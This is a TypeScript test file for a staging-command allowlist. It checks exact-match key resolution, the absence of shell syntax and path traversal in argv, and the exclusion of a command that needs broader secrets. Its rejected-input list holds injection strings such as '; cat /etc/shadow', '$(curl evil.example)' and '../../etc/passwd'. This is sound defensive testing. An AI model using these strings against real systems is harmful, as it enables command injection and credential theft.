/**
 * UTV2-1827 — the allowlist is the whole security boundary, so it is tested as
 * a boundary rather than as a lookup table.
 *
 * Every case below fails if the exact-match check in
 * `resolveStagingProofCommand` is loosened — to a prefix, a case-insensitive
 * compare, a substring, or a fallback default. That is the point: a green run
 * here is only worth something because these inputs are the ones an attacker or
 * a careless dispatcher would actually supply.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import {
  STAGING_PROOF_COMMANDS,
  STAGING_PROOF_COMMAND_KEYS,
  UnknownStagingProofCommandError,
  formatCommand,
  resolveStagingProofCommand,
} from './staging-proof-commands.js';

test('every admitted key resolves to its own fixed argv', () => {
  for (const command of STAGING_PROOF_COMMANDS) {
    const resolved = resolveStagingProofCommand(command.key);
    assert.equal(resolved.key, command.key);
    assert.ok(resolved.argv.length > 0, `${command.key} has an empty argv`);
  }
});

test('keys are unique — one key can never name two commands', () => {
  assert.equal(new Set(STAGING_PROOF_COMMAND_KEYS).size, STAGING_PROOF_COMMAND_KEYS.length);
});

test('no admitted argv contains a shell metacharacter or an interpolation point', () => {
  // spawnSync runs with shell:false, so these would be literal argv members
  // rather than shell syntax. They are still refused here, because an argv that
  // *reads* as shell is a standing invitation to reintroduce a shell later.
  const forbidden = /[;&|`$><\n]|\$\{|\$\(/u;
  for (const command of STAGING_PROOF_COMMANDS) {
    for (const argument of command.argv) {
      assert.ok(
        !forbidden.test(argument),
        `${command.key} argv member ${JSON.stringify(argument)} contains shell syntax`,
      );
    }
  }
});

test('no admitted argv escapes the repository via path traversal or an absolute path', () => {
  for (const command of STAGING_PROOF_COMMANDS) {
    for (const argument of command.argv) {
      assert.ok(!argument.includes('..'), `${command.key} argv contains '..': ${argument}`);
      assert.ok(!argument.startsWith('/'), `${command.key} argv is absolute: ${argument}`);
    }
  }
});

test('UTV2-1773 — the blocking bootstrap command is admitted', () => {
  // Requirement 5: the first admitted commands must cover UTV2-1773's concrete
  // blocker. If this key is ever renamed or dropped, UTV2-1773 silently loses
  // its only route to a first-run/second-run idempotency receipt.
  const bootstrap = resolveStagingProofCommand('canonical-reference-bootstrap');
  assert.equal(bootstrap.issue, 'UTV2-1773');
  assert.equal(bootstrap.writes, true);
  assert.deepEqual(
    [...bootstrap.argv],
    ['pnpm', 'exec', 'tsx', 'scripts/run-canonical-reference-bootstrap.ts'],
  );
});

test('UTV2-1771 is NOT admitted — its command would broaden secret authority', () => {
  // Requirement 5 admits UTV2-1771 only if it can run under the same credential
  // set. Its partition preservation needs a superuser SUPABASE_DB_URL, which is
  // strictly broader than the project-scoped CI_SUPABASE_* keys this runner
  // releases. Asserted so that admitting it later is a deliberate, reviewed act
  // rather than an unnoticed widening.
  for (const command of STAGING_PROOF_COMMANDS) {
    assert.notEqual(command.issue, 'UTV2-1771');
  }
});

const REJECTED_KEYS: ReadonlyArray<readonly [string, string]> = [
  ['', 'empty string'],
  ['   ', 'whitespace'],
  ['canonical-reference-bootstrap ', 'trailing whitespace'],
  ['Canonical-Reference-Bootstrap', 'different case'],
  ['canonical-reference-bootstra', 'truncated prefix'],
  ['canonical-reference-bootstrap-extra', 'key with a suffix appended'],
  ['scripts/run-canonical-reference-bootstrap.ts', 'a path instead of a key'],
  ['../../etc/passwd', 'path traversal'],
  ['/bin/sh', 'an absolute executable'],
  ['canonical-reference-bootstrap; cat /etc/shadow', 'a shell chain appended to a real key'],
  ['canonical-reference-bootstrap && curl evil.example', 'a shell conjunction'],
  ['$(curl evil.example)', 'command substitution'],
  ['`id`', 'backtick substitution'],
  ['pnpm exec tsx scripts/anything.ts', 'a free-form command line'],
];

for (const [candidate, why] of REJECTED_KEYS) {
  test(`refuses ${why}: ${JSON.stringify(candidate)}`, () => {
    assert.throws(
      () => resolveStagingProofCommand(candidate),
      (error: unknown) => {
        assert.ok(error instanceof UnknownStagingProofCommandError);
        assert.equal(error.requestedKey, candidate);
        return true;
      },
    );
  });
}

test('the refusal message names the admitted keys, so a caller can self-correct', () => {
  try {
    resolveStagingProofCommand('nope');
    assert.fail('expected a refusal');
  } catch (error) {
    const message = error instanceof Error ? error.message : String(error);
    for (const key of STAGING_PROOF_COMMAND_KEYS) {
      assert.ok(message.includes(key), `refusal did not name ${key}`);
    }
  }
});

test('formatCommand renders the argv as it is actually spawned', () => {
  const bootstrap = resolveStagingProofCommand('canonical-reference-bootstrap');
  assert.equal(
    formatCommand(bootstrap),
    'pnpm exec tsx scripts/run-canonical-reference-bootstrap.ts',
  );
});
